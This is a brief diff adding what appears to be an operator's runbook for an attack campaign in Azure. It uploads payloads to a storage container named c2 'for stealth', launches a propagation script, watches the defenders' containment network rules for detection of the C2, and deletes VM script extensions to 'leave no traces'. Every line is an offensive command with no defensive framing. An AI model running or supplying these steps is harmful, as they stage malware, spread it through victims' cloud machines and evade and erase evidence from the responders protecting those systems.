@@ -1,0 +1,11 @@
+# 1. Host payloads (use Azure CDN for stealth)
+az storage blob upload-batch --account-name yourstorage --source ./payloads/ --destination c2/
+
+# 2. Launch orchestrator
+python3 propagate.py
+
+# 3. Monitor NSG changes (blue team detection)
+watch -n 5 "az network nsg rule list --nsg-name containmentNSG --query '[?contains(name, \"C2\")]'"
+
+# 4. Cleanup (leave no traces)
+az vm extension delete --name CustomScript --resource-group targetRG --vm-name allVMs
